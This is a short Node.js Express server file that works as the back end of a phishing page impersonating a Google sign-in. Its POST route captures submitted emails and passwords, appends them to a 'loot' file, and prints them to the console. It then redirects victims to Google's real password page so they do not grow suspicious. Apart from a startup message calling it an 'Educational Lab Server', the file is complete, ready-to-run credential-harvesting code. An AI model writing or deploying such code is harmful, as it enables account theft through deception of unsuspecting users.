// server.js
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const app = express();
const PORT = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // This is where your HTML/CSS go

// The "Catch" Route
app.post('/auth/capture', (req, res) => {
    const { email, password } = req.body;
    
    const logEntry = `[${new Date().toISOString()}] Email: ${email} | Pass: ${password}\n`;
    
    // Write to a local file (the "loot" file)
    fs.appendFile('captured_creds.txt', logEntry, (err) => {
        if (err) console.error("Error writing to file", err);
    });

    console.log("Captured:", email, password);

    // Critical: Redirect to the real service to avoid suspicion
    res.redirect('https://accounts.google.com/signin/v2/challenge/pwd');
});

app.listen(PORT, () => {
    console.log(`Educational Lab Server running at http://localhost:${PORT}`);
});
